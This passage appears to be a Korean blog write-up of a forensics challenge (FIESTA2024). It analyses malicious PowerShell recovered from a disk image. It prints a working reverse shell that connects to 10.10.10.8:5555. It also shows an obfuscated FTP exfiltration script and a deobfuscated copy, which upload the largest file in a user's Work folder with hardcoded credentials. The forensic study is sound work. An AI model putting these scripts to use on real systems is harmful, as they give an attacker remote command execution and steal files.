&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.Sockets.TCPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\class.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;class.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TypeName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Text.ASCIIEncoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PS&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text.encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;리버스 쉘이다.&lt;/p&gt;

&lt;p&gt;해당 파일들은 2024년 7월 23일 오전 11:43:37에 생성되었다.&lt;/p&gt;

&lt;p&gt;악성 행위는 그 다음에 진행되었을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;주어진 디스크 이미지에서 로그 파일을 뽑았다.&lt;/p&gt;

&lt;p&gt;쉘코드를 실행했기 때문에 쉘 로그를 뽑음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\kusti\AppData\Local\Temp\mpev.ps1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ftp를 하는 쉘코드인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;mpev.ps1&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\kusti\Desktop\Work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ftp://10.10.10.8/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;send001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vkdlftjqj123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tymqfsdplx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sort-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Descending&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-First&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bhvkunqarl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dywrutljzc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip$tymqfsdplx&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vsjnriobex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.NetworkCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reokcjfzxw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UploadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dywrutljzc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bhvkunqarl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;난독화를 해제하면 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\kusti\Desktop\Work&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ftp://10.10.10.8/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;send001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vkdlftjqj123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sort-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Descending&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Select-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-First&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target_fileName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FullName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.NetworkCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UploadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target_fileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\kusti\Desktop\Work&lt;/code&gt; 디렉토리에 있는 가장 큰 파일을 원격지 서버에 업로드한다.&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;**위 악성행위가 수행된 시점에, 위 디렉토리에 있던 가장 큰 파일은 무엇**이었을까?&lt;/mark&gt;&lt;/p&gt;

&lt;p&gt;사실은… 해당 디렉토리를 보면 파일이 그렇게 많지 않다.&lt;/p&gt;

&lt;p&gt;따라서 파일 이름의 MD5SUM 값을 다 구해서 일일이 넣어보면 문제는 풀린다.&lt;/p&gt;

&lt;p&gt;그러나 좀 더 근거를 가지고 접근하고 싶으니 더 생각해보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

